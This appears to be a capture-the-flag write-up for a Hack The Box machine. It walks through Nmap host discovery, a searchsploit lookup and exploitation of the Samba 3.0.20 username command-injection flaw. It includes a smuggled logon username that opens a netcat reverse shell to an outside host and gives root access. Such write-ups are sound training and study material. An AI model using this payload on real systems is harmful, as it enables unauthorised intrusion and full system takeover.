### Host discovery

We will use Nmap for host discovery.

```shell
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.3 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -sC -sV -p$ports 10.10.10.3 
```

![Desktop view](/assets/img/sample/HTC/nmap_lame.png)

The output shows Samba running on port 445. As we will see below, this version is vulnerable.

## Samba exploit

```shell
searchsploit samba 3.0.20
```

> To connect to Samba, make the following configuration change.

```shell
vi /etc/samba/smb.conf
```

Add these settings:

`client min protocol = CORE`

`client max protocol = SMB3`

![Desktop view](/assets/img/sample/HTC/searchsploit_lame_samba.png)

Looking through the code, the issue is that it accepts otherwise forbidden characters in the username. Supplying a username in this form:

> username = "/=`nohup " + payload.encoded + "`"

allows Linux commands to be executed.

## Exploitation

First, start our listener.

```shell
nc -lnvp 443
```

Then try logging in with that username:

```shell
sudo smbclient //10.10.10.3/
logon "./=`nohup nc 10.10.14.29 443 -e /bin/bash`"
```

![Desktop view](/assets/img/sample/HTC/smb_client_lame.png)
![Desktop view](/assets/img/sample/HTC/root_login_lame.png)

The exploit worked. Finally, retrieve the flags:

```shell
cat /root/root.txt
cat /home/makis/user.txt
```

![Desktop view](/assets/img/sample/HTC/flags_lame.png)
